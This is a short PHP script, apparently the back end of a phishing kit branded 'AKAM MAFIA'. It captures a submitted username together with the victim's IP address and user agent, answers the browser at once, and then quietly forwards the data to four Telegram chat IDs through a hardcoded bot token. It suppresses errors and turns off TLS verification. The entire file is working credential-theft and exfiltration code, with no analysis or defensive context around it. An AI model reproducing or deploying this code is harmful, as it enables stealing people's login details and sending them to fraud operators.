<?php
error_reporting(0);
ignore_user_abort(true);
ob_start();

$u = isset($_POST['usr']) ? $_POST['usr'] : '';
$ip = $_SERVER['REMOTE_ADDR'];

$dis = $_SERVER['HTTP_USER_AGENT'];
$dis_corto = (strpos($dis, 'Android') !== false) ? "Android" : ((strpos($dis, 'iPhone') !== false) ? "iPhone" : "PC/Otros");

// Configuración de Bot y IDs
$token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
$ids = [
    "8114050673", 
    "6616662846", 
    "8638340940", 
    "8645545892" // Nuevo ID agregado
];  

if(!empty($u)){
    // Respuesta rápida al cliente
    echo "ok";
    header("Connection: close");
    header("Content-Length: " . ob_get_length());
    ob_end_flush();
    flush();

    // Construcción del mensaje full info
    $msg = "⭐ <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n\n";
    $msg .= "👤 <b>USUARIO:</b> <code>$u</code>\n";
    $msg .= "📱 <b>SISTEMA:</b> <code>$dis_corto</code>\n";
    $msg .= "📍 <b>IP:</b> <code>$ip</code>\n";
    $msg .= "🌐 <b>UA:</b> <code>$dis</code>";

    foreach($ids as $id){
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = [
            'chat_id' => $id,
            'text' => $msg,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5); // Timeout ajustado para mayor fluidez
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
} else {
    echo "error";
}
?>
